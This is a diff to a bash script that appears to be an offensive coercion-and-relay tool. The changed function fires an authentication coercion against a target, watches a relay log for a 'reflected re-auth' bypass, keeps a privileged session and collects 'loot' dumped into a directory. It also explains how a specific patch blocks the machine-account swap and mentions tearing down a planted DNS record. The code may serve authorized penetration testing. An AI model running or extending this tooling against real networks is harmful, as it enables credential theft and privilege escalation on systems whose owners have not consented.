@@ -349,13 +349,31 @@ cmd_auto() {
   cmd_coerce
 
   if [ "$DRY_RUN" -eq 0 ]; then
-    log "coercion fired; waiting up to ${LOOT_WAIT}s for loot to land in $LOOT_DIR ..."
-    local before after i; before="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
+    log "coercion fired; watching the relay for the reflected re-auth (up to ${LOOT_WAIT}s) ..."
+    local rl="$LOOT_DIR/relay.log" before after i outcome=none
+    before="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
     for i in $(seq 1 "$LOOT_WAIT"); do
+      grep -qF 'reauth-bypass] SUCCESS' "$rl" 2>/dev/null && outcome=success
+      grep -qF 're-auth refused'        "$rl" 2>/dev/null && { outcome=refused; break; }
       after="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
-      [ "$after" -gt "$before" ] && { ok "new loot in $LOOT_DIR:"; ls -1t "$LOOT_DIR" | grep -v relay.log | head >&2; break; }
+      [ "$after" -gt "$before" ] && { outcome=loot; break; }
       sleep 1
     done
+    case "$outcome" in
+      loot)
+        ok "re-auth bypass SUCCEEDED; new loot in $LOOT_DIR:"; ls -1t "$LOOT_DIR" | grep -v relay.log | head >&2;;
+      success)
+        ok "re-auth bypass SUCCEEDED - privileged session kept (dump may still be landing; see $rl).";;
+      refused)
+        warn "re-auth bypass REFUSED by the target (0xC0000022 in $rl)."
+        warn "this host enforces the same-identity / machine-identity check on re-auth"
+        warn "(CVE-2026-69676; KB5124008 ships it as 'Machine Identity Isolation'): the swap cannot work here."
+        warn "note: patchcheck #4 only tests a USER->USER swap, so it can read 'absent' while the"
+        warn "MACHINE-account reflection the attack needs is still blocked. The relay is authoritative.";;
+      none)
+        warn "no reflected re-auth reached the relay within ${LOOT_WAIT}s."
+        warn "most likely the victim could not reach your relay at $RELAY_IP - re-check -R reachability from the target subnet.";;
+    esac
   fi
   if [ "$KEEP_UP" -eq 1 ] && [ "$DRY_RUN" -eq 0 ]; then
     ok "relay staying up (pid $RELAY_PID); press Ctrl-C to stop it and tear down the DNS record."
